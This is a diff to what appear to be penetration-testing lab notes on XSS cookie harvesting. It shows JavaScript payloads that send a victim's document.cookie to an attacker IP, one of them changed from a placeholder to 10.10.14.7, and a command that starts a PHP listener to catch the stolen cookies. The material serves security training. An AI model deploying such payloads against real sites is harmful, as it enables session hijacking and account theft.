@@ -23,7 +23,7 @@ Now, if we log in, we can see information about the ticket and ways to post a re
 #### XXS Cookie Harvesting
 ```js
 document.location='http://OUR_IP/index.php?c='+document.cookie;
-new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://10.10.14.7/index.php?c='+document.cookie;
 ```
 
 PHP server for catching cookies
@@ -44,6 +44,8 @@ if (isset($_GET['c'])) {
 
 ```shell
 sudo php -S 0.0.0.0:80
+```
+
 
 #### Sensitive Data Exposure
 Let's say we are on an external penetration test. During our OSINT and information gathering, we discover several user credentials using the tool [Dehashed](http://dehashed.com/)
